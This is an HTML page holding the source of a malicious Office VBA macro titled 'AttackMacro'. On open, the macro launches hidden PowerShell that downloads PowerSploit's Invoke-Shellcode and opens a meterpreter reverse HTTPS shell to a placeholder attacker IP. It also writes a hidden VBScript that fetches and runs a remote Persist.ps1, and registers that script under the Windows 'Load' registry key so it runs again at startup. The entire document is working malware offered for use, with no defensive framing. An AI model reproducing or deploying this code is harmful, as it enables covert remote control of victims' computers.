<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>AttackMacro</title>
</head><body>#This uses a specified email address and subject in Outlook to trigger a meterpreter shell. The macro creates a VBScript file in a hidden directory that silently download and executes #a powershell script that parses the default inbox for the specified email address and subject. The script runs in the background all the time and is re-executed on startup.<br/>
<br/>
Sub Auto_Open()<br/>
Execute<br/>
Persist<br/>
Reg<br/>
Start<br/>
<br/>
End Sub<br/>
<br/>
Public Function Execute() As Variant<br/>
    Const HIDDEN_WINDOW = 0<br/>
    strComputer = &quot;.&quot;<br/>
    Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)<br/>
    <br/>
    Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)<br/>
    Set objConfig = objStartup.SpawnInstance_<br/>
    objConfig.ShowWindow = HIDDEN_WINDOW<br/>
    Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2:Win32_Process&quot;)<br/>
    objProcess.Create &quot;powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.x.xxx -Lport 1111 -Force&quot;, Null, objConfig, intProcessID<br/>
  End Function<br/>
  <br/>
Public Function Persist() As Variant<br/>
Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br/>
  Set a = fs.CreateTextFile(&quot;C:\Users\Public\config.txt&quot;, True)<br/>
  a.WriteLine (&quot;Dim objShell&quot;)<br/>
  a.WriteLine (&quot;Set objShell = WScript.CreateObject(&quot;&quot;WScript.Shell&quot;&quot;)&quot;)<br/>
  a.WriteLine (&quot;command = &quot;&quot;C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://xxx.xxx.x.xxx/Persist.ps1'))&quot;&quot;&quot;)<br/>
  a.WriteLine (&quot;objShell.Run command,0&quot;)<br/>
  a.WriteLine (&quot;Set objShell = Nothing&quot;)<br/>
  a.Close<br/>
  GivenLocation = &quot;C:\Users\Public\&quot;<br/>
  OldFileName = &quot;config.txt&quot;<br/>
  NewFileName = &quot;config.vbs&quot;<br/>
  Name GivenLocation &amp; OldFileName As GivenLocation &amp; NewFileName<br/>
  SetAttr &quot;C:\Users\Public\config.vbs&quot;, vbHidden<br/>
End Function<br/>
<br/>
Public Function Reg() As Variant<br/>
Set WshShell = CreateObject(&quot;WScript.Shell&quot;)<br/>
WshShell.RegWrite &quot;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load&quot;, &quot;C:\Users\Public\config.vbs&quot;, &quot;REG_SZ&quot;<br/>
Set WshShell = Nothing<br/>
<br/>
End Function<br/>
<br/>
Public Function Start() As Variant<br/>
Const HIDDEN_WINDOW = 0<br/>
    strComputer = &quot;.&quot;<br/>
    Shell &quot;wscript C:\Users\Public\config.vbs&quot;, vbNormalFocus<br/>
   <br/>
End Function<br/>
</body></html>